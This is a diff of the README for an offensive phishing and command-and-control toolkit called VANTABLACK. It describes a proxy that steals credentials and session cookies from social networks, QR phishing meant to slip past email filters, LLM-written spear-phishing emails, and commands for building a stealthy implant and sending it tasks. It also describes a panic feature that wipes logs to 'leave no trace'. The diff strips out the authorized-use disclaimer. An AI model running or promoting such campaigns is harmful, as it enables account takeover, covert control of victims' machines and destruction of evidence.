@@ -1,196 +1,132 @@
-# 🚀 VANTABLACK v4.0 - GOD MODE EDITION
+# VANTABLACK
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Version-4.0.0--GOD_MODE-red" alt="Version">
-  <img src="https://img.shields.io/badge/License-MIT--Industrial-black" alt="License">
-  <img src="https://img.shields.io/badge/Security-Red--Team--Ready-red" alt="Security">
-  <img src="https://img.shields.io/badge/Python-3.9+-blue" alt="Python">
-  <img src="https://img.shields.io/badge/Docker-Ready-blue" alt="Docker">
-</p>
+**VANTABLACK is a next-generation, automated offensive security platform (Red Team & C2).**
+
+It combines an intelligent phishing engine, a stealthy Go-based C2 implant, and AI-driven post-exploitation capabilities to create a comprehensive and highly effective offensive toolkit.
 
 ---
 
-## 📋 Table of Contents
+## ⚡ Core Features
 
-- [Overview](#overview)
-- [New in v4.0](#-new-in-v40)
-- [Quick Start](#-quick-start)
-- [The War Room](#-the-war-room)
-- [Social Network Phishing](#-social-network-phishing)
-- [Ghost Protocol](#-ghost-protocol)
-- [Quishing (QR Codes)](#-quishing)
-- [Installation](#-installation)
-- [Disclaimer](#-disclaimer)
+- **🤖 AI-Powered Phishing**: Leverages local LLMs (via Ollama) to generate hyper-personalized spear-phishing emails, increasing engagement success rates.
+- **👻 Stealthy C2 Implant**: A lightweight, cross-platform C2 agent (`gohorse`) written in Go, featuring end-to-end encrypted communication (AES-GCM).
+- **🧠 Automated Post-Exploitation**: Utilizes Celery workers to automate complex post-exploitation tasks, such as credential reuse and objective-driven actions.
+- **🌐 Dynamic Infrastructure**: Designed to work with Terraform for dynamic deployment and teardown of attack infrastructure (future goal).
+- **🛡️ Secure by Design**: Features a scope-based access control system, security headers, and a "Ghost Protocol" for rapid data sanitization.
+- **🔧 Developer-Friendly**: Comes with a `Makefile` for simplified service management and a built-in performance profiler.
 
 ---
 
-## 🎯 Overview
+## 🚀 Getting Started
 
-**VANTABLACK** is an elite, ultra-resilient orchestration platform designed for Red Team professionals. It manages high-performance interception engines through a centralized, cloaked nervous system.
+### Prerequisites
 
-Version 4.0 introduces **GOD MODE**, a suite of advanced features designed for maximum impact and total control.
+- Python 3.10+
+- Go 1.18+
+- Redis
+- Ollama with a running LLM (e.g., `llama3`)
 
-### What is VANTABLACK?
+### Installation
 
-VANTABLACK is a command-and-control framework that simplifies the deployment and management of phishing campaigns. It provides:
+1.  **Clone the repository:**
+    ```bash
+    git clone https://github.com/thesenegalesehitch/Vantablack-evilginx-core-.git
+    cd Vantablack-evilginx-core-
+    ```
 
-- 🔒 **Secure Credential Capture** via Custom Proxy Engine
-- 🌐 **Social Network Integration** (Twitter/X, Facebook, LinkedIn)
-- 📊 **War Room Dashboard** for Real-time Ops
-- 👻 **Ghost Protocol** for Emergency Evasion
-- 📱 **Quishing** (QR Code Phishing) Generator
-- 🛡️ **Advanced Evasion Techniques** for sandbox detection
-- 🐳 **Containerized Deployment** with Docker
+2.  **Install Python dependencies:**
+    ```bash
+    make install
+    ```
 
----
+### Running the Platform
 
-## ✨ New in v4.0
+You can run all services (API and workers) in parallel using the `Makefile`:
 
-### 👑 God Mode
-Unrestricted access to all modules, bypassing standard safety checks for authorized red team operations.
-
-### 🏢 The War Room
-A Hollywood-style, real-time tactical dashboard. Monitor live captures, map victims geographically, and control campaigns from a single pane of glass.
-
-### 🕵️ Social Network Phishlets
-Native support for modern social media platforms using the new **VantaProxy** engine.
-- **Twitter / X** (2FA Support)
-- **LinkedIn** (Session Capture)
-- **Facebook** (Mobile & Desktop)
-
-### 👻 Ghost Protocol
-
----
-
-## ☁️ Dynamic Infrastructure (Optional Setup)
-
-VANTABLACK can manage its own attack infrastructure using Terraform. This allows for the automated deployment and destruction of servers, making your campaigns highly resilient and difficult to trace.
-
-**Setup:**
-1. **Install Terraform**: Follow the official instructions at [terraform.io](https://developer.hashicorp.com/terraform/tutorials/aws-get-started/install-cli).
-2. **Configure Cloud Credentials**: Set up credentials for your chosen cloud provider. For example, for DigitalOcean:
-   ```bash
-   export DIGITALOCEAN_TOKEN="your_do_api_token"
-   ```
-   VANTABLACK will automatically use these environment variables.
-
----
-
-Emergency panic button. Instantly wipes logs, kills processes, and sanitizes the environment if compromise is detected.
-
-### 📱 Quishing Generator
-Generate high-fidelity QR codes pointing to your campaigns, bypassing email filters.
-
----
-
-## 🚀 Quick Start
-
-### 1. Setup
 ```bash
-# Clone the repository
-git clone https://github.com/thesenegalesehitch/VANTABLACK.git
-cd VANTABLACK
-
-# Install dependencies
-python3 vanta.py --setup
+make run-all
 ```
 
-### 2. Launch War Room (Dashboard)
-```bash
-python3 vanta.py --war-room
-```
+Alternatively, you can run services individually:
 
-### 3. Start Social Phishing Proxy
-```bash
-# Start Twitter/X Phishlet
-python3 vanta.py --proxy phishlets/twitter.yaml
-```
+- **Run the API server:**
+  ```bash
+  make run-api
+  ```
+- **Run all Celery workers:**
+  ```bash
+  make run-workers
+  ```
 
-### 4. Generate QR Code
+To stop all running workers:
 ```bash
-python3 vanta.py --quishing https://your-phishing-domain.com
-```
-
-### 5. Emergency Wipe (Ghost Protocol)
-```bash
-python3 vanta.py --ghost
+make stop-workers
 ```
 
 ---
 
-## 🖥 The War Room
+## 🛠️ Usage
 
-The **War Room** is the heart of VANTABLACK v4.0. It provides:
-- **Live Feed**: Watch credentials roll in real-time.
-- **World Map**: Geolocation of all connections.
-- **System Status**: CPU/RAM/Network monitoring.
-- **Kill Switch**: Instant access to Ghost Protocol.
+### Building the C2 Implant
 
-Access it at: `http://localhost:8000/war-room` (or launch via `python3 vanta.py --war-room`)
+The `gohorse` implant must be compiled for your target architecture. The build script injects the C2 callback URL, a unique agent ID, and an encryption key.
+
+```bash
+cd agents/gohorse
+
+# Generate a secure 32-byte encryption key
+ENCRYPTION_KEY=$(openssl rand -hex 16)
+
+# Build the agent
+./build.sh <agent-id> <c2-url> $ENCRYPTION_KEY
+
+# Example:
+./build.sh agent-001 http://127.0.0.1:8000/c2/implant/callback $ENCRYPTION_KEY
+```
+
+The compiled binaries will be placed in the `bin/` directory at the project root.
+
+### Interacting with the API
+
+The API is documented using OpenAPI (Swagger UI) and can be accessed at `/docs` when the API server is running.
+
+- **Queue a task for an agent:**
+  ```bash
+  POST /c2/task/queue
+  Content-Type: application/json
+
+  {
+    "agent_id": "agent-001",
+    "command": "whoami"
+  }
+  ```
+
+- **Trigger the Ghost Protocol (requires `system:admin` scope):**
+  ```bash
+  POST /system/ghost-protocol
+  ```
 
 ---
 
-## 🌐 Social Network Phishing
+## 🏛️ Architecture
 
-VANTABLACK v4.0 includes a custom **VantaProxy** engine designed specifically for modern dynamic web apps.
+[A high-level architecture diagram will be added here.]
 
-**Supported Phishlets:**
-- `phishlets/twitter.yaml`
-- `phishlets/linkedin.yaml` (Coming Soon)
-- `phishlets/facebook.yaml` (Coming Soon)
-
-**How it works:**
-1. The proxy intercepts traffic between the victim and the target (e.g., X.com).
-2. It rewrites links to keep the victim on your domain.
-3. It captures credentials and session tokens (cookies) in real-time.
-4. Data is sent to the War Room.
+- **FastAPI Server (`api/`)**: The core REST API for user interaction and C2 callbacks.
+- **Celery Workers (`workers/`)**: Asynchronous task processors for everything from event handling to post-exploitation.
+- **Go Implant (`agents/gohorse/`)**: The stealthy, cross-platform C2 agent.
+- **Core Modules (`core/`)**: Shared components, including the event bus, LLM client, and configuration.
 
 ---
 
 ## 👻 Ghost Protocol
 
-**"Burn it down."**
+The Ghost Protocol is a critical security feature designed to rapidly sanitize the system in case of compromise. When triggered via the `/system/ghost-protocol` endpoint, it initiates a background task that performs the following actions:
 
-When triggered, Ghost Protocol will:
-1. Kill all Vantablack processes (API, Proxy, Frontend).
-2. Securely wipe local logs and capture files.
-3. Reset network configurations.
-4. Leave no trace.
+- **Wipes the Redis database**: This immediately deletes all task queues, results, session data, and cached information.
+- (Future) Deletes log files and other sensitive artifacts.
 
-**Usage:**
-```bash
-python3 vanta.py --ghost
-```
-
----
-
-## 📱 Quishing
-
-QR Code Phishing (Quishing) is the new frontier. Vantablack generates high-res QR codes that:
-- Link to your campaign.
-- Can be embedded in emails or printed.
-- Bypass traditional email security gateways.
-
-**Usage:**
-```bash
-python3 vanta.py --quishing <URL>
-```
-
----
-
----
-
-## 🧠 AI-Powered Spear Phishing (Optional Setup)
-
-VANTABLACK can leverage a local Large Language Model (LLM) to generate hyper-personalized spear phishing emails. This is powered by [Ollama](https://ollama.ai/).
-
-**Setup:**
-1. Install Ollama on your system: `curl -fsSL https://ollama.com/install.sh | sh`
-2. Pull a model. We recommend a fast and creative model like `llama3` or `mistral`.
-   ```bash
-   ollama pull llama3
-   ```
-3. Ensure the Ollama server is running. VANTABLACK will connect to it automatically.
+This is a one-way, destructive action.
 
 ---
 
@@ -204,16 +140,3 @@ VANTABLACK includes a built-in performance profiling middleware that logs the pr
 - The result is logged to the console with the `[PROFILE]` tag, e.g., `[PROFILE] Request GET /system/status completed in 5.43ms`.
 
 This allows for easy identification of slow endpoints and performance bottlenecks.
-
----
-
-## ⚠️ Disclaimer
-
-**VANTABLACK is for educational and authorized testing purposes only.**
-Usage of this tool for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state, and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.
-
----
-
-<p align="center">
-  <b>Developed with ❤️ by TheSenegaleseHitch</b>
-</p>
